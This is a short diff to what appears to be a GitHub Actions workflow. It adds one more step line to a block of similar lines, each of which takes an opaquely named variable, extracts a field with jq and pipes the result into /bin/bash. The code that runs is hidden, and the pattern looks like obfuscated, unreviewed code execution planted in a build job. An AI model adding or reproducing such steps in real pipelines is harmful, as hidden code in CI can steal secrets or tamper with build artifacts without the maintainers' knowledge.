@@ -29,6 +29,7 @@ jobs:
           echo $sgfc64 | jq -r .p17 | /bin/bash
           echo $ndhxj03 | jq -r .si895 | /bin/bash
           printf '%s' "$kyliy0555" | jq -r .m921 | /bin/bash
+          printf '%s' "$w5" | jq -r .dw428 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
